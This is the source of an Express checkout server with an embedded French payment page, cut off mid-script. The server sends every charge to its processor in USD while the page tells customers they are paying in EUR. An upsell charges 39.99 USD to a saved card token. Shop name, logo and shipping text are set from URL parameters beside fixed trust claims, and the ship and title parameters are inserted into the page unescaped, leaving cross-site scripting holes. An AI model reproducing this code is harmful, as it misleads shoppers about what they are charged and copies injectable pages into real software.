import express from "express";
import crypto from "node:crypto";

const {
  MERCHANT_ACCOUNT,
  MERCHANT_PASSWORD,
  QDR_API_BASE = "https://api.qdr6wy.im",
  QDR_SDK_URL = "https://api.qdr6wy.im/js/checkout.js",
  PUBLIC_BASE_URL = "http://localhost:3000",
  CHECKOUT_SIGNING_SECRET = "dev-secret",
  SHOP_NAME = "",
  PORT = 3000,
  MOCK_MODE = "false",
} = process.env;

const MOCK = String(MOCK_MODE).toLowerCase() === "true";

// On force l'USD pour toutes les requêtes bancaires QDR en arrière-plan
const QDR_CURRENCY = "USD"; 

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const transactions = new Map();

// --- GESTION COMPATIBILITÉ API QDR (Format 1:1 et 1:many / transactions array) ---
function getPayloadTransaction(payload) {
  if (!payload) return null;
  if (Array.isArray(payload.transactions)) {
    return payload.transactions[0];
  }
  return payload;
}

function sign(payload) {
  return crypto.createHmac("sha256", CHECKOUT_SIGNING_SECRET).update(payload).digest("hex");
}
function buildSignedPayload({ amount, currency, orderRef }) {
  return `${orderRef}|${amount}|${currency}`;
}
function sanitizeShop(s) {
  if (!s) return "";
  return String(s).replace(/[<>"`]/g, "").trim().slice(0, 40);
}
function verifySignature(q) {
  const { amount, currency, order_ref, sig } = q;
  if (!amount || !currency || !order_ref || !sig) return false;
  const expected = sign(buildSignedPayload({ amount, currency, orderRef: order_ref }));
  try { return crypto.timingSafeEqual(Buffer.from(sig), Buffer.from(expected)); } catch { return false; }
}

async function callQdr(pathname, body) {
  if (MOCK) return mockQdr(pathname);
  const res = await fetch(`${QDR_API_BASE}${pathname}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", Accept: "application/json" },
    body: JSON.stringify(body),
  });
  const text = await res.text();
  try { return JSON.parse(text); }
  catch { return { status: "error", message: `Reponse non-JSON (${res.status}): ${text.slice(0, 300)}` }; }
}

function mockQdr(pathname) {
  if (pathname.endsWith("/init")) {
    return { session_id: "mock-" + crypto.randomUUID(),
      payload: { session_token: crypto.randomUUID(), team_id: "team_mock123", app_id: "app_mock456" },
      status: "success", code: 0, message: "success (mock)" };
  }
  if (pathname.endsWith("/complete")) {
    return { status: "success", code: 0, message: "success (mock)",
      token: crypto.randomUUID() + crypto.randomUUID().slice(0, 4) };
  }
  if (pathname.endsWith("/token")) {
    return { status: "success", code: 0, message: "success (mock token sale)", payload: { transaction_status: "SUCCESS" } };
  }
  return { status: "error", message: "mock: route inconnue" };
}

app.get("/health", (_req, res) => res.json({ ok: true, mock: MOCK }));

app.get("/start", (req, res) => {
  const { amount, currency } = req.query;
  let order_ref = req.query.order_ref;
  if (!amount || !currency) return res.status(400).send("Parametres manquants.");
  if (!order_ref || !String(order_ref).trim()) order_ref = "cart-" + crypto.randomUUID();
  const sig = sign(buildSignedPayload({ amount, currency, orderRef: order_ref }));
  const items = req.query.items ? `&items=${encodeURIComponent(req.query.items)}` : "";
  const shop = req.query.shop ? `&shop=${encodeURIComponent(req.query.shop)}` : "";
  const ship = req.query.ship ? `&ship=${encodeURIComponent(req.query.ship)}` : "";
  const logo = req.query.logo ? `&logo=${encodeURIComponent(req.query.logo)}` : "";
  const title = req.query.title ? `&title=${encodeURIComponent(req.query.title)}` : "";
  res.redirect(`/checkout?amount=${encodeURIComponent(amount)}&currency=${encodeURIComponent(currency)}&order_ref=${encodeURIComponent(order_ref)}&sig=${sig}${items}${shop}${ship}${logo}${title}`);
});

app.get("/checkout", (req, res) => {
  if (!verifySignature(req.query)) return res.status(400).send("Lien de paiement invalide ou expire.");
  const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
  const shipParam = req.query.ship ? String(req.query.ship).trim() : "";
  const shipping = shipParam || "🚚 Chronopost Express · Livraison 48h offerte";

  const titleParam = req.query.title ? String(req.query.title).replace(/[<>"`]/g, "").slice(0, 80) : "";
  const heading = titleParam || brand;
  
  const logoRaw = req.query.logo ? String(req.query.logo).trim() : "";
  const isValidLogo = /^https:\/\/[^\s"'<>]+$/i.test(logoRaw) && 
                      !logoRaw.includes('ton-site.com') && 
                      !logoRaw.includes('logo-ici') &&
                      logoRaw.length > 10;

  const brandBlock = isValidLogo
    ? `<img class="shoplogo" src="${logoRaw.slice(0, 400)}" alt="${heading}"/>`
    : `<div class="logo-circle">${heading.slice(0,1).toUpperCase()}</div><span class="shop-name-text">${heading}</span>`;

  res.type("html").send(CHECKOUT_HTML
    .replace(/__BRAND_BLOCK__/g, brandBlock)
    .replace(/__SHOP_NAME__/g, heading)
    .replace(/__SHIPPING__/g, shipping));
});

app.get("/upsell", (req, res) => {
  const { txn, shop } = req.query;
  const transaction = transactions.get(txn);
  if (!transaction) return res.redirect(`/return?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
  
  const brand = sanitizeShop(shop) || SHOP_NAME;
  const productName = transaction.productTitle || "Produit";

  res.type("html").send(UPSELL_HTML
    .replace(/__SHOP_NAME__/g, brand)
    .replace(/__PRODUCT_NAME__/g, productName)
    .replace(/__TXN_ID__/g, txn));
});

app.get("/return", (req, res) => {
  const brand = sanitizeShop(req.query.shop) || SHOP_NAME;
  res.type("html").send(RETURN_HTML.replace(/__SHOP_NAME__/g, brand));
});

app.get("/config.js", (_req, res) => {
  res.type("application/javascript").send(
    `window.CHECKOUT_CONFIG = ${JSON.stringify({ sdkUrl: QDR_SDK_URL, apiBase: PUBLIC_BASE_URL })};`
  );
});

let cachedSdk = null;
async function getSdkIds() {
  if (cachedSdk) return cachedSdk;
  if (MOCK) { cachedSdk = { team_id: "team_mock123", app_id: "app_mock456" }; return cachedSdk; }
  let host = "checkout.local";
  try { host = new URL(PUBLIC_BASE_URL).hostname; } catch {}
  const data = await callQdr("/v2/cc/sale3d/init", {
    merchant_account: MERCHANT_ACCOUNT, merchant_password: MERCHANT_PASSWORD,
    transaction_unique_id: crypto.randomUUID(), amount: 1, currency: QDR_CURRENCY,
    first_name: "Client", last_name: "Client", address: "", city: "", state: "", zip: "",
    country: "FRA", user_phone: "", user_email: "checkout@" + host, user_ip: "0.0.0.0",
    callback_url: `${PUBLIC_BASE_URL}/api/webhook`, redirect_url: `${PUBLIC_BASE_URL}/return`,
  });
  if (data.status === "success" && data.payload) {
    const tx = getPayloadTransaction(data.payload);
    if (tx) {
      cachedSdk = { team_id: tx.team_id, app_id: tx.app_id };
    } else {
      cachedSdk = { team_id: data.payload.team_id, app_id: data.payload.app_id };
    }
  }
  return cachedSdk;
}
app.get("/api/sdk", async (_req, res) => {
  try {
    const ids = await getSdkIds();
    if (!ids) return res.status(502).json({ status: "error", message: "SDK indisponible" });
    res.json({ status: "success", team_id: ids.team_id, app_id: ids.app_id });
  } catch (e) { res.status(500).json({ status: "error", message: e.message }); }
});

app.post("/api/init", async (req, res) => {
  try {
    const { amount, currency, order_ref, sig, customer, shop, title } = req.body || {};
    if (!verifySignature({ amount, currency, order_ref, sig }))
      return res.status(400).json({ status: "error", message: "Signature montant invalide." });
    const transaction_unique_id = crypto.randomUUID();
    const c = customer || {};
    const initBody = {
      merchant_account: MERCHANT_ACCOUNT, merchant_password: MERCHANT_PASSWORD,
      transaction_unique_id, amount: Number(amount), currency: QDR_CURRENCY, // Envoyé en USD brut
      first_name: c.first_name || "", last_name: c.last_name || "", address: c.address || "",
      city: c.city || "", state: c.state || "", zip: c.zip || "", country: c.country || "FRA",
      user_phone: c.phone || "", user_email: c.email || "",
      user_ip: req.headers["x-forwarded-for"]?.split(",")[0]?.trim() || req.ip,
      callback_url: `${PUBLIC_BASE_URL}/api/webhook`,
      redirect_url: `${PUBLIC_BASE_URL}/api/bridge?txn=${transaction_unique_id}` + (shop ? `&shop=${encodeURIComponent(shop)}` : ""),
    };
    const data = await callQdr("/v2/cc/sale3d/init", initBody);
    if (data.status !== "success" || !data.payload)
      return res.status(502).json({ status: "error", message: data.message || "init a echoue", raw: data });
    
    const payloadTx = getPayloadTransaction(data.payload);

    let productTitle = title || "Produit";
    if (req.body.items) {
      try {
        const decodedItems = JSON.parse(decodeURIComponent(escape(atob(req.body.items))));
        if(decodedItems && decodedItems[0]) productTitle = decodedItems[0].title;
      } catch(e){}
    }

    transactions.set(transaction_unique_id, {
      orderRef: order_ref, amount: Number(amount), currency: "EUR", status: "initiated", // On garde "EUR" pour l'affichage final
      sessionToken: payloadTx ? payloadTx.session_token : data.payload.session_token,
      productTitle: productTitle,
      upsellAccepted: false,
      customer: {
        first_name: c.first_name || "", last_name: c.last_name || "", email: c.email || "",
        country: c.country || "FRA", address: c.address || "", city: c.city || "",
        state: c.state || "", zip: c.zip || "", phone: c.phone || "",
      },
      userIp: initBody.user_ip,
      shop: shop || "",
    });
    res.json({ status: "success", transaction_unique_id,
      session_token: payloadTx ? payloadTx.session_token : data.payload.session_token, 
      team_id: payloadTx ? payloadTx.team_id : data.payload.team_id, 
      app_id: payloadTx ? payloadTx.app_id : data.payload.app_id });
  } catch (e) { console.error("init error", e); res.status(500).json({ status: "error", message: e.message }); }
});

app.get("/api/bridge", (req, res) => {
  const { txn, shop } = req.query;
  res.redirect(`/upsell?txn=${encodeURIComponent(txn)}&shop=${encodeURIComponent(shop)}`);
});

// Correction pour accepter aussi le POST sur /api/bridge
app.post("/api/bridge", (req, res) => {
  const { txn, shop } = req.query || req.body;
  res.redirect(`/upsell?txn=${encodeURIComponent(txn || '')}&shop=${encodeURIComponent(shop || '')}`);
});

app.post("/api/complete", async (req, res) => {
  try {
    const { transaction_unique_id, session_token, card_token, encrypted_cvv, bin, last4,
      card_holder, card_exp_month, card_exp_year } = req.body || {};
    const txn = transactions.get(transaction_unique_id);
    if (!txn) return res.status(404).json({ status: "error", message: "Transaction inconnue/expiree." });
    const data = await callQdr("/v2/cc/sale3d/complete", {
      session_token, card_token, encrypted_cvv, bin, last4, card_holder, card_exp_month, card_exp_year });
    
    txn.status = data.status || "unknown";
    txn.code = data.code;
    
    const transaction = getPayloadTransaction(data.payload);
    if (transaction && transaction.transaction_status) {
      txn.transactionStatus = transaction.transaction_status;
    }
    if (data.token || (transaction && transaction.token)) {
      txn.billToken = data.token || transaction.token;
    }
    transactions.set(transaction_unique_id, txn);
    
    const acsUrl = data.acs_url || data.acsUrl || data.redirect || (transaction && transaction.acs_url);
    res.json({ status: data.status, code: data.code, message: data.message, acs_url: acsUrl || null });
  } catch (e) { console.error("complete error", e); res.status(500).json({ status: "error", message: e.message }); }
});

app.post("/api/upsell/submit", async (req, res) => {
  try {
    const { transaction_unique_id } = req.body || {};
    const txn = transactions.get(transaction_unique_id);
    if (!txn || !txn.billToken) return res.status(400).json({ status: "error", message: "Donnees de facturation manquantes." });
    
    const targetCountry = txn.customer.country && txn.customer.country.length >= 2 ? txn.customer.country.slice(0,3) : "FRA";
    const tokenPayload = {
      merchant_account: MERCHANT_ACCOUNT,
      merchant_password: MERCHANT_PASSWORD,
      transaction_unique_id: "up-" + crypto.randomUUID(),
      amount: "39.99",
      currency: "USD", // On demande 39,99 Dollars bruts à la banque
      token: txn.billToken,
      first_name: txn.customer.first_name || "Client",
      last_name: txn.customer.last_name || "Client",
      user_email: txn.customer.email,
      user_ip: txn.userIp || "0.0.0.0",
      country: targetCountry
    };

    const data = await callQdr("/v2/cc/sale/token", tokenPayload);
    const s = (data.status || "").toLowerCase();
    
    const transaction = getPayloadTransaction(data.payload);
    const ts = (transaction && transaction.transaction_status || "").toLowerCase();
    
    if (s === "success" || ts === "success" || data.code === 0) {
      txn.upsellAccepted = true;
      txn.amount = Number(txn.amount) + 39.99; // Ajout comptable pour l'affichage EUR du pixel
      transactions.set(transaction_unique_id, txn);
      return res.json({ status: "success" });
    }
    return res.status(502).json({ status: "error", message: data.message || "Echec du prelevement de l'upsell." });
  } catch(e) {
    res.status(500).json({ status: "error", message: e.message });
  }
});

app.post("/api/webhook", async (req, res) => {
  try {
    const payload = req.body || {};
    const transaction = getPayloadTransaction(payload);
    const id = (transaction && (transaction.transaction_unique_id || transaction.reference)) || payload.transaction_unique_id || payload.transactionUniqueId;
    const txn = id ? transactions.get(id) : null;
    if (txn) {
      txn.status = payload.status || txn.status;
      if (transaction && transaction.transaction_status) txn.transactionStatus = transaction.transaction_status;
      if (payload.code !== undefined) txn.code = payload.code;
      if (transaction && transaction.token) txn.billToken = transaction.token;
      transactions.set(id, txn);
    }
    res.json({ received: true });
  } catch (e) { console.error("webhook error", e); res.status(200).json({ received: true }); }
});

app.get("/api/status", (req, res) => {
  const txn = transactions.get(req.query.txn);
  if (!txn) return res.status(404).json({ status: "unknown" });
  res.json({ 
    status: txn.status, 
    code: txn.code,
    transactionStatus: txn.transactionStatus || "",
    amount: txn.amount, 
    currency: txn.currency 
  });
});

app.get("*", (req, res) => {
  res.status(404).send("Page introuvable.");
});

app.listen(PORT, () => {
  console.log(`Checkout server sur ${PUBLIC_BASE_URL} (port ${PORT}) — mock=${MOCK}`);
});

const COUNTRY_OPTIONS = [
  ["FRA","France"],["BEL","Belgique"],["CHE","Suisse"],["LUX","LUXembourg"],["MCO","Monaco"],
  ["CAN","Canada"],["DEU","Allemagne"],["ESP","Espagne"],["ITA","Italie"],["PRT","Portugal"],
  ["NLD","Pays-Bas"],["GBR","Royaume-Uni"],["IRL","Irlande"],["USA","Etats-Unis"],["AUT","Autriche"],
  ["POL","Pologne"],["SWE","Suede"],["DNK","Danemark"],["NOR","Norvege"],["FIN","Finlande"],
  ["GRC","Grece"],["MAR","Maroc"],["DZA","Algerie"],["TUN","Tunisie"],["SEN","Senegal"],
  ["CIV","Cote d'Ivoire"],["AUS","Australie"],["JPN","Japon"]
].map(c => `<option value="${c[0]}">${c[1]}</option>`).join("");

const CHECKOUT_HTML = `<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Paiement - __SHOP_NAME__</title>
<link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>

<!-- Facebook Pixel Code -->
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init','1405300981421901');
fbq('track','PageView');

try {
  var qs = new URLSearchParams(window.location.search);
  var amountVal = qs.get('amount') ? Number(qs.get('amount')) : 0;
  var currencyVal = qs.get('currency') || 'EUR';
  fbq('track', 'AddToCart', { value: amountVal, currency: currencyVal });
  fbq('track', 'InitiateCheckout', { value: amountVal, currency: currencyVal });
} catch(e){}
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1405300981421901&ev=PageView&noscript=1"/></noscript>

<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',system-ui,sans-serif;color:#2d3748;background:#f7fafc;line-height:1.5}
.topbar{background:#fff;border-bottom:1px solid #e2e8f0;padding:16px 0}
.topbar-in{max-width:1140px;margin:0 auto;padding:0 24px;display:flex;align-items:center;justify-content:space-between}
.logo-area{display:flex;align-items:center;gap:12px}
.logo-circle{width:36px;height:36px;background:#3b82f6;color:#fff;border-radius:8px;display:flex;align-items:center;justify-content:center;font-weight:700;font-size:18px}
.shop-name-text{font-size:18px;font-weight:700;color:#1a202c}
.shoplogo{max-height:36px;width:auto;display:block}
.secure-badge-top{margin-left:auto;color:#a0aec0;font-size:13px;display:flex;align-items:center;gap:6px}
.wrap{max-width:1140px;margin:0 auto;display:flex;flex-wrap:wrap;padding:24px;gap:24px}
.col-form{flex:1 1 640px;display:flex;flex-direction:column;gap:20px}
.col-sum{flex:1 1 400px;display:flex;flex-direction:column;gap:16px}
@media(max-width:900px){.wrap{padding:12px;gap:16px}.col-form,.col-sum{flex:1 1 100%}.col-sum{order:-1}}
.block-card{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:24px;position:relative}
.block-title-row{display:flex;align-items:center;gap:12px;margin-bottom:20px}
.step-num{width:28px;height:28px;background:#3b82f6;color:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:600;font-size:14px}
.block-card h2{font-size:16px;font-weight:700;color:#1a202c;margin:0}
.form-group{margin-bottom:16px}
.form-group label{display:block;font-size:13px;font-weight:500;color:#4a5568;margin-bottom:6px}
.form-control{width:100%;height:46px;border:1px solid #cbd5e0;border-radius:6px;padding:0 14px;font-size:14px;color:#2d3748;outline:none;background:#fff;transition:border-color 0.15s}
.form-control:focus{border-color:#3b82f6;box-shadow:0 0 0 1px #3b82f6}
.form-control::placeholder{color:#a0aec0}
.row-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px}
@media(max-width:550px){.row-grid{grid-template-columns:1fr}}
.ship-box{border:1px solid #cbd5e0;background:#fff;border-radius:8px;padding:16px;display:flex;align-items:center;justify-content:space-between;font-size:14px}
.ship-box-left{display:flex;align-items:center;gap:12px}
.ship-icon{font-size:20px}
.ship-details{display:flex;flex-direction:column}
.ship-name{font-weight:600;color:#1a202c}
.card-brands-row{display:flex;gap:8px;margin-bottom:16px}
.card-brand-img{height:22px;border:1px solid #e2e8f0;border-radius:4px;padding:2px 4px;background:#fff}
#card-container{min-height:46px;margin-top:8px}
#card-ph{font-size:13px;color:#718096;padding:16px;border:1px dashed #cbd5e0;border-radius:6px;text-align:center;background:#f7fafc}
.btn-pay{width:100%;height:52px;background:#3b82f6;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;box-shadow:0 2px 4px rgba(59,130,246,0.2);transition:background 0.15s}
.btn-pay:hover:not(:disabled){background:#2563eb}
.btn-pay:disabled{opacity:0.6;cursor:default;box-shadow:none}
.secure-bottom-text{font-size:12px;color:#a0aec0;text-align:center;margin-top:14px}
.sum-box{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:24px}
.sum-title-row{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px}
.sum-title{font-size:15px;font-weight:700;color:#1a202c}
.toggle-items{color:#3b82f6;font-size:13px;text-decoration:none}
.sum-item{display:flex;align-items:center;gap:12px;margin-bottom:14px}
.sum-thumb{position:relative;width:52px;height:52px;border-radius:6px;background:#edf2f7;border:1px solid #e2e8f0;display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.sum-qty{position:absolute;top:-6px;right:-6px;background:#718096;color:#fff;font-size:10px;width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:600}
.sum-name-wrap{flex:1}
.sum-name{font-size:13px;font-weight:600;color:#2d3748}
.sum-variant{font-size:11px;color:#718096;margin-top:1px}
.sum-price{font-size:13px;font-weight:600;color:#1a202c}
.promo-row{display:flex;gap:10px;margin:16px 0;border-top:1px solid #edf2f7;border-bottom:1px solid #edf2f7;padding:16px 0}
.promo-input{flex:1;height:38px;border:1px solid #cbd5e0;border-radius:6px;padding:0 12px;font-size:13px;outline:none}
.promo-btn{height:38px;padding:0 16px;background:#f7fafc;border:1px solid #cbd5e0;border-radius:6px;font-size:13px;font-weight:500;cursor:pointer;color:#4a5568}
.sum-line{display:flex;justify-content:space-between;font-size:13px;color:#4a5568;margin-bottom:10px}
.sum-line-total{display:flex;justify-content:space-between;align-items:baseline;font-size:20px;font-weight:700;color:#1a202c;border-top:1px solid #edf2f7;padding-top:14px;margin-top:14px}
.sum-line-total .tax-info{font-size:11px;color:#a0aec0;font-weight:400;display:block;text-align:right;margin-top:2px}
.trust-box{background:#fff;border:1px solid #e2e8f0;border-radius:12px;padding:20px;display:flex;flex-direction:column;gap:14px}
.trust-item{display:flex;align-items:center;gap:12px;font-size:13px;color:#4a5568}
.trust-icon{font-size:16px;color:#718096;display:flex;align-items:center}
.error-msg{color:#e53e3e;font-size:13px;font-weight:500;margin-top:10px;min-height:18px}
</style></head><body>

<div class="topbar"><div class="topbar-in"><div class="logo-area">__BRAND_BLOCK__</div><div class="secure-badge-top">🔒 <span id="lang-sec-top">Paiement sécurisé</span></div></div></div>

<div class="wrap">
  <div class="col-form">
    <!-- 1. Coordonnées -->
    <div class="block-card">
      <div class="block-title-row"><div class="step-num">1</div><h2 id="lang-block1">Coordonnées</h2></div>
      <div class="form-group">
        <label id="lang-email">Adresse e-mail</label>
        <input id="email" type="email" class="form-control" placeholder="nom@exemple.com"/>
      </div>
    </div>

    <!-- 2. Adresse de livraison -->
    <div class="block-card">
      <div class="block-title-row"><div class="step-num">2</div><h2 id="lang-block2">Adresse de livraison</h2></div>
      <div class="row-grid">
        <div class="form-group"><label id="lang-fn">Prénom</label><input id="first_name" class="form-control" placeholder="Jean"/></div>
        <div class="form-group"><label id="lang-ln">Nom</label><input id="last_name" class="form-control" placeholder="Dupont"/></div>
      </div>
      <div class="form-group"><label id="lang-addr">Adresse</label><input id="address" class="form-control" placeholder="12 rue de la Paix"/></div>
      <div class="row-grid">
        <div class="form-group"><label id="lang-zip">Code postal</label><input id="zip" class="form-control" placeholder="75001"/></div>
        <div class="form-group"><label id="lang-city">Ville</label><input id="city" class="form-control" placeholder="Paris"/></div>
      </div>
      <div class="row-grid">
        <div class="form-group"><label id="lang-country">Pays</label><select id="country" class="form-control">${COUNTRY_OPTIONS}</select></div>
        <div class="form-group"><label id="lang-phone">Téléphone</label><input id="phone" class="form-control" placeholder="+33 6 00 00 00 00"/></div>
      </div>
    </div>

    <!-- 3. Mode de livraison -->
    <div class="block-card">
      <div class="block-title-row"><div class="step-num">3</div><h2 id="lang-block3">Mode de livraison</h2></div>
      <div class="ship-box">
        <div class="ship-box-left"><span class="ship-icon" id="lang-ship-icon">🚚</span><div class="ship-details"><span class="ship-name" id="lang-ship-display">__SHIPPING__</span></div></div>
        <span class="ship-price" id="lang-free1">Gratuit</span>
      </div>
    </div>

    <!-- 4. Informations de paiement -->
    <div class="block-card">
      <div class="block-title-row"><div class="step-num">4</div><h2 id="lang-block4">Informations de paiement</h2></div>
      <div class="card-brands-row">
        <img src="https://cdn-icons-png.flaticon.com/512/349/349221.png" class="card-brand-img" alt="Visa"/>
        <img src="https://cdn-icons-png.flaticon.com/512/349/349228.png" class="card-brand-img" alt="Mastercard"/>
        <img src="https://cdn-icons-png.flaticon.com/512/349/349230.png" class="card-brand-img" alt="Amex"/>
      </div>
      <div class="form-group"><label id="lang-holder">Titulaire de la carte</label><input id="card_holder" class="form-control" placeholder="Jean Dupont"/></div>
      <div id="card-ph">Chargement du module de paiement sécurisé…</div>
      <div id="card-container"></div>
      <div id="error" class="error-msg"></div>
      <button id="pay-btn" class="btn-pay" disabled><span id="pay-btn-text">Payer maintenant</span></button>
      <div class="secure-bottom-text" id="lang-sec-bot">🔒 Paiement chiffré 256-bit · Vos données sont protégées</div>
    </div>
  </div>

  <div class="col-sum">
    <div class="sum-box">
      <div class="sum-title-row"><span class="sum-title" id="lang-recap">Récapitulatif</span><a href="#" class="toggle-items" id="lang-hide">Masquer les articles</a></div>
      <div id="sum-items"></div>
      <div class="promo-row">
        <input type="text" class="promo-input" id="lang-promo-ph" placeholder="Code de réduction"/>
        <button class="promo-btn" id="lang-promo-btn">Appliquer</button>
      </div>
      <div class="sum-line"><span id="lang-sub">Sous-total</span><span id="sum-sub">—</span></div>
      <div class="sum-line"><span id="lang-ship-line">Livraison</span><span id="lang-free2">Gratuit</span></div>
      <div class="sum-line-total">
        <span id="lang-total-line">Total</span>
        <div style="text-align:right"><span><span class="cur" id="sum-cur"></span><span id="sum-total">—</span></span><span class="tax-info" id="lang-tax">Taxes incluses</span></div>
      </div>
    </div>

    <div class="trust-box">
      <div class="trust-item"><span class="trust-icon" id="lang-t1-icon">🔒</span><span id="lang-t1">Paiement 100% sécurisé et chiffré</span></div>
      <div class="trust-item"><span class="trust-icon" id="lang-t2-icon">⚡</span><span id="lang-t3">Expédition rapide et suivie</span></div>
      <div class="trust-item"><span class="trust-icon" id="lang-t3-icon">✅</span><span id="lang-t2">Produit officiel garanti</span></div>
      <div class="trust-item"><span class="trust-icon" id="lang-t4-icon">💬</span><span id="lang-t4">Support client 7j/7</span></div>
    </div>
  </div>
</div>

<script src="/config.js"></script>
<script>
(function(){
var qs=new URLSearchParams(location.search);
var order={amount:qs.get('amount'),currency:qs.get('currency'),order_ref:qs.get('order_ref'),sig:qs.get('sig'),shop:qs.get('shop')};
var DCUR='EUR';
var disp=order.amount?(order.amount+' '+DCUR):'—';
document.getElementById('sum-sub').textContent=disp;
document.getElementById('sum-cur').textContent=DCUR;
document.getElementById('sum-total').textContent=order.amount||'—';
function esc(s){return String(s==null?'':s).replace(/[&<>"]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c];});}

function renderItems(){
var html='';
var raw=qs.get('items');
if(raw){try{var arr=JSON.parse(decodeURIComponent(escape(atob(raw))));arr.forEach(function(it){
var img=it.img?('<img src="'+esc(it.img)+'" alt="" style="width:100%;height:100%;object-fit:cover;border-radius:6px"/>'):'🛍️';
html+='<div class="sum-item"><div class="sum-thumb">'+img+'<span class="sum-qty">'+(it.qty||1)+'</span></div><div class="sum-name-wrap"><div class="sum-name">'+esc(it.title)+'</div>'+(it.variant?'<div class="sum-variant">'+esc(it.variant)+'</div>':'')+'</div><div class="sum-price">'+esc(it.price)+' '+DCUR+'</div></div>';
});}catch(e){}}
if(!html){html='<div class="sum-item"><div class="sum-thumb">🛍️<span class="sum-qty">1</span></div><div class="sum-name-wrap"><div class="sum-name">'+(qs.get('title')||'Commande __SHOP_NAME__')+'</div><div class="sum-variant">Paiement sécurisé</div></div><div class="sum-price">'+disp+'</div></div>';}
document.getElementById('sum-items').innerHTML=html;
}
renderItems();

var translations = {
  fr: { secTop: "Paiement sécurisé", b1: "Coordonnées", email: "Adresse e-mail", b2: "Adresse de livraison", fn: "Prénom", ln: "Nom", addr: "Adresse", zip: "Code postal", city: "Ville", country: "Pays", phone: "Téléphone", b3: "Mode de livraison", free: "Gratuit", b4: "Informations de paiement", holder: "Titulaire de la carte", btn: "Payer maintenant", secBot: "🔒 Paiement chiffré 256-bit · Vos données sont protégées", recap: "Récapitulatif", hide: "Masquer les articles", promo: "Code de réduction", apply: "Appliquer", sub: "Sous-total", total: "Total", tax: "Taxes incluses", t1: "Paiement 100% sécurisé et chiffré", t2: "Produit officiel garanti", t3: "Expédition rapide et suivie", t4: "Support client 7j/7", shipDisplay: "Chronopost Express" }
};

var userLang = 'fr';
var t = translations[userLang];
if (t) {
  document.getElementById('lang-sec-top').textContent = t.secTop;
  document.getElementById('lang-block1').textContent = t.b1;
  document.getElementById('lang-email').textContent = t.email;
  document.getElementById('lang-block2').textContent = t.b2;
  document.getElementById('lang-fn').textContent = t.fn;
  document.getElementById('lang-ln').textContent = t.ln;
  document.getElementById('lang-addr').textContent = t.addr;
  document.getElementById('lang-zip').textContent = t.zip;
  document.getElementById('lang-city').textContent = t.city;
  document.getElementById('lang-country').textContent = t.country;
  document.getElementById('lang-phone').textContent = t.phone;
  document.getElementById('lang-block3').textContent = t.b3;
  document.getElementById('lang-free1').textContent = t.free;
  document.getElementById('lang-block4').textContent = t.b4;
  document.getElementById('lang-holder').textContent = t.holder;
  document.getElementById('pay-btn-text').textContent = t.btn;
  document.getElementById('lang-sec-bot').textContent = t.secBot;
  document.getElementById('lang-recap').textContent = t.recap;
  document.getElementById('lang-hide').textContent = t.hide;
  document.getElementById('lang-promo-ph').placeholder = t.promo;
  document.getElementById('lang-promo-btn').textContent = t.apply;
  document.getElementById('lang-sub').textContent = t.sub;
  document.getElementById('lang-ship-line').textContent = "Livraison";
  document.getElementById('lang-free2').textContent = t.free;
  document.getElementById('lang-total-line').textContent = t.total;
  document.getElementById('lang-tax').textContent = t.tax;
  document.getElementById('lang-t1').textContent = t.t1;
  document.getElementById('lang-t2').textContent = t.t2;
  document.getElementById('lang-t3').textContent = t.t3;
  document.getElementById('lang-t4').textContent = t.t4;
  var rawShip = qs.get('ship') || t.shipDisplay;
  document.getElementById('lang-ship-display').textContent = rawShip.replace(/[🎟️🚚]/g, "").trim();
}

var sess=null,ready=false,cardReady=false;
function v(id){return document.getElementById(id).value.trim();}
function showError(m){document.getElementById('error').textContent=m;}
function setPay(on){var b=document.getElementById('pay-btn');b.disabled=on;document.getElementById('pay-btn-text').textContent=on?'…':(t ? t.btn : 'Payer maintenant');}

function loadSdk(){return new Promise(function(res,rej){if(window.Checkout)return res();var s=document.createElement('script');s.src=window.CHECKOUT_CONFIG.sdkUrl;s.onload=res;s.onerror=function(){rej(new Error('Error'));};document.head.appendChild(s);});}

fetch('/api/sdk').then(function(r){return r.json();}).then(function(data){
if(data.status!=='success')throw new Error(data.message);
return loadSdk().then(function(){
Checkout.init({containerId:'card-container',team_id:data.team_id,app_id:data.app_id,language:userLang,
onReady:function(){cardReady=true;document.getElementById('pay-btn').disabled=false;document.getElementById('card-ph').style.display='none';},
onCard:onCard,
onError:function(e){setPay(false);showError(e.message||'Error');}});
});
}).catch(function(e){document.getElementById('card-ph').textContent='…';});

function onCard(cd){
var shopNameParam = order.shop ? '&shop=' + encodeURIComponent(order.shop) : '';
fetch('/api/complete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({transaction_unique_id:sess.transaction_unique_id,session_token:sess.session_token,card_token:cd.cardToken,encrypted_cvv:cd.encryptedCvv,bin:cd.bin,last4:cd.last4,card_holder:v('card_holder'),card_exp_month:cd.expMonth,card_exp_year:cd.expYear})})
